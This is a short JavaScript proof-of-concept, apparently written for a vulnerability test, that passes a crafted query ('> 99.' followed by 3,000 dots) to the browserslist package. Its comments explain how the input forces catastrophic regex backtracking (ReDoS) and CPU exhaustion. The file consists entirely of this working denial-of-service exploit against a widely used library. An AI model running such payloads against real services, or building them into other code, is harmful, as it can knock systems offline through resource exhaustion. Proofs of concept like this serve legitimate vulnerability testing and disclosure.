```js
async function exploit() {
   const browserslist = require('browserslist');

   // Craft a query string targeting ambiguous quantifiers (\d*\.?\d+ or similar)
   // in the package's internal version/percentage parsing regexes. The payload 
   // provides a prefix that partially matches the pattern, followed by a massive 
   // sequence of dots to force catastrophic backtracking when the engine attempts 
   // to greedily resolve overlapping groups.
   const maliciousPayload = '> 99.' + '.'.repeat(3000);

   console.log(`[PoC] Triggering ReDoS with payload length: ${maliciousPayload.length}`);

   // Execution triggers internal query resolution against vulnerable regex patterns.
   // The engine enters an exponential backtracking loop as it tries every combination 
   // of the ambiguous quantifiers to find a match boundary. As the backtrack count 
   // rapidly surpasses the 30,000 threshold, it demonstrates the ReDoS condition through 
   // severe CPU exhaustion or an explicit backtrack limit error. Exceptions will propagate 
   // naturally to prove the failure state without suppression.
   return browserslist(maliciousPayload);
}

await exploit();
